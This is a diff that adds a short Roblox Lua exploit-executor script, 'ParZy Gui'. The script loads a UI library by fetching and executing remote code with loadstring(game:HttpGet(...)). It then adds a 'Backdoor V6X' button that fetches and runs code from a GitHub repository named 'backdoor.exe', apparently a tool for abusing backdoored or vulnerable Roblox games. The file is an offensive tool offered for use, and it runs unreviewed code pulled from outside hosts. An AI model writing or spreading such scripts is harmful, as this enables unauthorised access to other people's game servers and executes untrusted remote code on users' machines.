@@ -1,0 +1,14 @@
+local redzlib = loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/RedzLibV5/main/Source.Lua"))()
+
+local Window = redzlib:MakeWindow({
+  Title = "ParZy Gui",
+  SubTitle = "V1.5.4.6 BETA WORKING",
+  SaveFolder = "Redz Config"
+})
+
+local Tab1 = Window:MakeTab({"Executor", "Executor"})
+
+Tab1:AddButton({"Backdoor V6X", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/v6x/source.lua"))()
+print("Succeed👏")
+end})
